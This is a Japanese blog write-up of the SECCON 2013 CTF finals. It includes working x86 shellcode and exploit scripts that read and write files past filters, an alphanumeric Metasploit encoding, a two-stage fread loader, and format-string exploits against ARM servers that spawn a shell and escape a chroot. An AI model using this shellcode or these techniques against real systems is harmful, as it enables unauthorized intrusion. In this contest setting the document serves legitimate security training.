---
date: '2014-03-04T06:45:08+09:00'
title: 'SECCON 二連覇しました。(SECCON 2013 決勝 writeup)'
categories:
 - CTF
 - writeup
tags:
 - SECCON
---

## 結果

{{<image classes="fancybox" src="/assets/seccon-2013-finals-writeup/seccon2013-score-mod.jpg" title="スコアの推移">}}

{{<image classes="fancybox" src="/assets/seccon-2013-finals-writeup/07a99802f28b64656dd4f4187644d1d8.png" title="問題一覧">}}

問題一覧の画像とCSSを保存し忘れた。 

チーム0x0としてSECCON 2013 全国大会に参加しました。

今回のメンバーはwasao, waidotto, nolzeと私です。\
4139ptで優勝しました。

<!--more-->

## 解いた問題

### 2.kaku

通天閣

問題ページでデーモンのバイナリ・ソースコード・xinetdの設定ファイルを固めたzipと、デーモンのアドレスが公開されている。

1.  forkを無効にする
2.  権限を降格
3.  stdinからシェルコードのサイズとシェルコード本体を読み込む
4.  フィルタにひっかからないかチェック
5.  実行

するデーモンが動いている。

ステージをクリアしキーワードを送信すると次のステージが現れる。

#### stage1

制限なし。やるだけ

exploit:

    #!/usr/bin/python
    import pack
    import sys

    #cat keyword.txt
    buf =  ""
    buf += "\xeb\x36\xb8\x05\x00\x00\x00\x5b\x31\xc9\xcd\x80\x89"
    buf += "\xc3\xb8\x03\x00\x00\x00\x89\xe7\x89\xf9\xba\x00\x10"
    buf += "\x00\x00\xcd\x80\x89\xc2\xb8\x04\x00\x00\x00\xbb\x01"
    buf += "\x00\x00\x00\xcd\x80\xb8\x01\x00\x00\x00\xbb\x00\x00"
    buf += "\x00\x00\xcd\x80\xe8\xc5\xff\xff\xff\x6b\x65\x79\x77"
    buf += "\x6f\x72\x64\x2e\x74\x78\x74\x00"
     
    sys.stdout.write(pack.pl32(len(buf)))
    sys.stdout.flush()
    sys.stdout.write(buf)

#### stage2

フィルターでシェルコードが 英数字で構成されているかチェックされる。

metasploitのx86/alpha\_mixed
エンコーダでシェルコードを英数字に変換する。

alpha\_mixedエンコーダは
シェルコードのアドレスが入ったレジスタを指定しないとシェルコードの全てが英数字にならない。

シェルコードへのアドレスがEAXに残っているので、

    msf> set BufferRegister EAX
    msf> generate -e x86/alpha_mixed

でシェルコードを生成する。

exploit:

    #!/usr/bin/python
    import pack
    import sys
    import time
     
    #cat keyword.txt
    buf =  ""
    buf += "\x50\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
    buf += "\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30"
    buf += "\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42"
    buf += "\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
    buf += "\x58\x6b\x67\x46\x4c\x78\x75\x55\x37\x70\x67\x70\x73"
    buf += "\x30\x31\x4b\x56\x51\x4f\x39\x58\x4d\x4d\x50\x6b\x39"
    buf += "\x6a\x63\x6d\x68\x64\x43\x43\x30\x67\x70\x45\x50\x6b"
    buf += "\x39\x79\x77\x6b\x39\x38\x79\x4f\x4a\x35\x50\x66\x70"
    buf += "\x35\x50\x65\x50\x58\x4d\x4f\x70\x6f\x79\x4f\x32\x4e"
    buf += "\x58\x66\x64\x57\x70\x77\x70\x35\x50\x4d\x6b\x43\x31"
    buf += "\x73\x30\x63\x30\x45\x50\x78\x4d\x6d\x50\x58\x38\x33"
    buf += "\x31\x75\x50\x57\x70\x77\x70\x4d\x6b\x35\x50\x43\x30"
    buf += "\x47\x70\x53\x30\x68\x4d\x4b\x30\x79\x78\x69\x55\x6b"
    buf += "\x4f\x6b\x4f\x69\x6f\x62\x4b\x63\x55\x61\x69\x31\x67"
    buf += "\x52\x4f\x50\x72\x35\x34\x76\x4e\x44\x34\x31\x68\x63"
    buf += "\x44\x73\x30\x41\x41"
    sys.stdout.write(pack.pl32(len(buf)))
    sys.stdout.flush()
    sys.stdout.write(buf)

#### stage3

シェルコードがアセンブラ短歌のフォーマットになっているかチェックするようになる。


    #include <libdis.h>
     
    static const int phrase_lengths[] = {5, 7, 5, 7, 7};
    static const int phrase_num =
        sizeof(phrase_lengths) / sizeof(phrase_lengths[0]);
     
    int filter(size_t sz, char *ptr)
    {
        int             retval = 0;
        size_t          byte_pos;
        int             phrase_pos;
        int             boundary;
        x86_insn_t      insn;
        unsigned int    insn_len;
     
        x86_init(opt_none, NULL, NULL);
     
        // Tanka checker
        byte_pos = 0;
        phrase_pos = 0;
        boundary = phrase_lengths[phrase_pos];
        while(byte_pos < sz && phrase_pos < phrase_num){
            insn_len = x86_disasm(ptr, sz, 0, byte_pos, &insn);
            if(insn_len == 0){
                retval = 1;
                goto END;
            }
            byte_pos += insn_len;
            if(byte_pos == boundary){
                if(++phrase_pos <= phrase_num - 1){
                    boundary += phrase_lengths[phrase_pos];
                }else{
                    break;
                }
            }else if (byte_pos > boundary){
                retval = 1;
                goto END;
            }
        }
        if(byte_pos != sz || phrase_pos != phrase_num){
            retval = 1;
        }
     
    END:
        x86_cleanup();
     
        return retval;
    }

5命令でファイルを表示するのは難しいので、freadでシェルコードを末尾に追加する。

[オンライン予選のbin500と同じように](/2014/01/seccon-2013-online-quals-writeup/#hack-this-site-bin500)
プレフィックスを付けて命令長を調整した。

stdin 変数は 0x08049184にあるが、 push dword
[0x08049184]は6バイトになってしまう。esp+0x10にstdin変数の中身が残っているのでそれをpushする。

終了後に 最大5命令しか使えないわけではなく 命令の途中が5, 7, 5, 7,
7バイトに引っかかっていなければよいことに気づいた。

stage1:

    bits 32
    org 0x80491c0
     
    ;5
    db 0x2e
    push dword [esp+0x10] ;stdin
    ;7
    db 0x2e,0x2e
    push 2048
    ;5
    db 0x2e,0x2e,0x2e
    push 1
    ;7
    db 0x2e,0x2e
    push stage2
    ;7
    db 0x2e,0x2e
    call 0x08048780 ;fread
     
    stage2:

exploit:

    #!/usr/bin/python
    import pack
    import sys
     
    #stage1
    buf = "\x2e\xff\x74\x24\x10\x2e\x2e\x68\x00\x08\x00\x00\x2e\x2e\x2e\x6a\x01\x2e\x2e\x68\xdf\x91\x04\x08\x2e\x2e\xe8\xa1\xf5\xff\xff"
    sys.stdout.write(pack.pl32(len(buf)))
    sys.stdout.write(buf)
     
    #stage2
    #cat keyword.txt
    buf =  ""
    buf += "\xeb\x36\xb8\x05\x00\x00\x00\x5b\x31\xc9\xcd\x80\x89"
    buf += "\xc3\xb8\x03\x00\x00\x00\x89\xe7\x89\xf9\xba\x00\x10"
    buf += "\x00\x00\xcd\x80\x89\xc2\xb8\x04\x00\x00\x00\xbb\x01"
    buf += "\x00\x00\x00\xcd\x80\xb8\x01\x00\x00\x00\xbb\x00\x00"
    buf += "\x00\x00\xcd\x80\xe8\xc5\xff\xff\xff\x6b\x65\x79\x77"
    buf += "\x6f\x72\x64\x2e\x74\x78\x74\x00"
    sys.stdout.write(buf)

#### stage4

nabytes.binの中身(最大2バイト) の一部
がシェルコードに含まれていないかチェックするようになる。

nabytes.binの中身は空だった。

flagword.txtに自チームのフラッグワードを書き込むことができる。

終了後に作問者から
nabytes.binに書き込んで他のチームを妨害できると教えてもらった。

shellcode\_stage1.asm:

    bits 32
    org 0x804a340
     
    ;5
    db 0x2e
    push dword [esp+0x10] ;stdin
    ;7
    db 0x2e,0x2e
    push 2048
    ;5
    db 0x2e,0x2e,0x2e
    push 1
    ;7
    db 0x2e,0x2e
    push stage2
    ;7
    db 0x2e,0x2e
    call 0x08048810 ;fread

     
    stage2:

shellcode\_stage2.asm:

    org 0x804a340 + 5 + 7 + 5 + 7 + 7
    bits 32
     
    mov ebx, path
    mov eax,0x5            ;sys_open
    mov ecx, 0x400+0x40+1 ;O_APPEND | O_CREAT | O_WRONLY
    int 0x80
     
    mov ebx, eax       ;fd
    mov eax, 4         ;sys_write
    mov ecx, flagword  ;buf
    mov edx, 0x1000    ;len
    int 0x80
     
    hlt
     
    path:
    db "flagword.txt", 0
    flagword:
    db "95f13c77edc735fc82258d878a54d91e", 0x0a
    flagword_end:

exploit:

    #!/usr/bin/python
    import pack
    import sys
     
    #stage1
    buf = open("shellcode_stage1", "rb").read()
    sys.stdout.write(pack.pl32(len(buf)))
    sys.stdout.write(buf)
     
    #stage2
    buf = open("shellcode_stage2", "rb").read()
    sys.stdout.write(buf)

### Druaga

ドルアーガの塔

サーバーからダウンロードできる yuko\_oshima.binはtruecryptのボリュームらしい。

展開するとキーワードとzipが出てくる。

    $ nkf KEY\{OoiOtya\}.txt 
    Linux/x86環境にて 0609 と表示するアセンブラ短歌を探し出し
    そのアセンブラ短歌が書かれた画像の MD5値 を求めよ！

    KEY{MD5(taka.jpg)}

    ※）アルファベットは小文字

    Enjoy Hacking! :)

朝起きたらすでにチームメイトが画像をテキストに変換するコードを完成させていたので、3/
を変換して下のコードで実行させてみたら 0609 が出てきた。運が良かった。

    #!/usr/bin/python
    import subprocess
    import sys
    import binascii
    for path in sys.stdin:
        path = path.rstrip()
     
        tanka = open(path, "r").read()
        if ("cd80" in tanka) or ("0f05" in tanka):
            tanka_unhexed = binascii.unhexlify(tanka)
            print "execute " + path
            #途中で無限ループする短歌が出てくるので実行時間を制限する
            p = subprocess.Popen("ulimit -t 2 && ./executor 2>/dev/null", shell=True, stdin=subprocess.PIPE)
            p.stdin.write(tanka_unhexed)
            p.stdin.flush()
            p.stdin.close()
            p.wait()



    //gcc -m32 -fno-stack-protector -z execstack executor.c -o executor
    #include <stdio.h>
    #include <string.h>
     
    int main(int argc, char **argv) {
        char buf[4096];
        memset(buf, 0xf4, sizeof(buf)); //hlt
        fread(buf, 1, 4095, stdin);
        return ((int (*)())buf)();
    }

/3/93/73/taka.jpgが正解のファイル。

あとはチームメイトが解いた。

@waidottoのwriteup: [SECCON 2013 全国大会 Write up](http://d.hatena.ne.jp/waidotto/20140303)

### Hanoi

ハノイの塔

#### stage1

readfile.phpにファイル名と ファイル名のmd5sumを渡すと
特定のファイルを読み込める。

readfile.phpでindex.phpを読み込むとキーワードが出てくる。

    Access granted to index.php!

    if ($_SERVER[REQUEST_METHOD] == 'POST')
    {
    echo "ACCESS DENIED!

    ";
    }
    //
    // stage1:
    // KEY{!2345&QwertY}
    // Hint to Next Step: 
    // Did you inspect whole web contents on this server?
    //
    ?>
    ...

top.gifの後にDNSのパケットがくっついていたので、送信元のサーバーを調べてみたがよくわからなかった。

勘でstage3のサーバーを見つけたが時間切れになった。

### Babel

バベルの塔

babel.tower:5060で pureserver、babel.tower:5061で
jamserverが動いていて、両方のバイナリにフォーマット文字列脆弱性がある。

    $ file *server
    jamserver:  ELF 32-bit LSB executable, ARM, version 1 (SYSV), statically linked, for GNU/Linux 2.6.18, BuildID[sha1]=0x4788d869615da8fec8c98810fb205940a0a9af1f, not stripped
    pureserver: ELF 32-bit LSB executable, ARM, version 1 (SYSV), statically linked, for GNU/Linux 2.6.18, BuildID[sha1]=0x01adec44d315228ee41dc71ed8eb2e4d1656d50d, not stripped

#### stage1

jamserverに接続すると実行される /home/jam/bin/putskeyの出力にAAで「Key is CurryRice」と書かれているが、制御文字で隠されている。

lessで表示したら答えが出てきた。

#### stage2

pureserverは 入力を受け取りprintfした後、 /usr/bin/calを起動する。

"/usr/bin/cal"を指すポインタが書き換え可能。バイナリ内に"/bin/sh"があるので、そこにポインタを変更することでシェルを起動できる。

/home/pure/key.txtのキーワードを読み込めるようになる。

フラッグワードのファイルに書き込むにはjamserverの権限が必要なので、まだ書き込めない。

exploit:

    #!/usr/bin/python
    #pureserver
    from libformatstr import *
     
    DEST = 0x23485C70
    BINSH = 0x23467CB0
    BUFIDX = 4
     
    p = FormatStr()
    p[DEST] = BINSH
     
    print p.payload(BUFIDX)

#### stage3

jamserverは /home/jamにchrootし権限降格した後、/bin/putskeyを起動する。文字列"/bin/putskey"が書き換え可能。

/home/jam/tmpのパーミッションが777なのでpureserverの権限でファイルをコピーできる。

chroot環境には最低限のライブラリしか入っていないので、jamserverでの作業にはbusyboxを使う。

まず、pureserverのシェルで busyboxを /home/jam/tmpにコピーする。

次に/bin/shを/home/jam/tmp/putskeyとしてコピーする。(入力文字列の長さ制限が厳しいので、最低限の書き換えで済むようにする)

exploitで"/bin/putskey"を"/tmp/putskey"に書き換えてシェルを起動すると、/home/jam/key.txtにあるキーワードを読み込めるようになる。

exploit:

    #!/usr/bin/python
    from libformatstr import *
    import sys
    import pack
    DEST = 0x23485D48    #/bin/putskey
    BUFIDX = 4
     
    p = FormatStr()
    p[DEST] = "/tmp"
     
    sys.stdout.write(p.payload(BUFIDX))

#### stage4

jamserverでシェルをsetuidし、pureserverから叩くことでchroot環境外でjamユーザになれる。

/home/key.txtにあるキーワードが読み込めるようになる。

さらに/var/www/flag.txtにフラッグワードを書き込むことができるようになる。
